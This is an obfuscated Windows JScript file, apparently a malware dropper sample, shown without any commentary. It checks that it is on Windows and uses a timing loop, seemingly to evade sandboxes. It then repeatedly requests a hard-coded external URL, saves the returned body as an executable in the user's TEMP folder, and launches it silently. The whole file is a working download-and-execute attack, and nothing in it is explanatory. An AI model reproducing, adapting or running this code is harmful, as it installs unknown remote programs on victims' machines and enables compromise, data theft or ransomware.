var eg = false;
var W = "CreateObject";
var l0 = function pJ() {return WScript[W]("WScript.Shell");}(), m = 11;
var a = "MSXML2.XMLHTTP";
var jQ = 2123213;
var ht = 0;
function MC(NG){l0["Run"](NG, ht, ht);};
function Qc(){return "" + a;};
function z0(Aw, V){ht = ht * 1; return Aw - V;};
function B(){return W;};
/*@cc_on
  @if (@_win32 || @_win64)
    eg = true;
  @end
@*/
if (eg)
{
var RC = "";
function J(){return 22;};
var YK = 0; var Fg = 0;
function wp()
{
var Fm = new this["Date"]();
var et = Fm["getUTCMilliseconds"]();
WScript["Sleep"](J());
var Fm = new this["Date"]();
var x = Fm["getUTCMilliseconds"]();
WScript["Sleep"](J());
var Fm = new this["Date"]();
var Z = Fm["getUTCMilliseconds"]();
var YK = "l";
YK = z0(x, et);
var Fg = "u";
Fg = z0(Z, x);
RC = "open";
return z0(YK, Fg);
}
var H = false;
var q = false;
for (var aC = ht; aC < J() * 1; aC++){if (wp() != ht){
H = true; 
Fg = "31" + 11 * YK + Fg; 
q = true; 
break;
}}
function e() {return ((H == true) && (H == q)) ? 1 : ht;};
if (H && e() && q){
function E() {return l0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5KHyECYUNtbTRvo.exe";};
 zr = Qc();
 R = WScript[W](zr);
 var Eg = 1;
 while (Eg){
try {
R[RC]("GET", "http://aztechnologies.co.uk/sdj3oa", false);
R["send"]();
G = "Sleep";
for (;;){WScript[G](J() * 11); if (R["readystate"] >= 2 * 2) break;};
Eg = ht;
} catch(o){};
}
function z(J0) {var Iq = (1, 2, 3, 4, 5, J0); return Iq;};
r = WScript[B()]("ADODB.Stream");
zr = r;
zr[RC]();
zr["type"] = z(1);
zr["write"](R["ResponseBody"]);
r["position"] = z(ht);
zr["Save" + "ToFile"](E(), 2);
r["c"+"lose"]();
cO = E();
MC(cO);
}
}

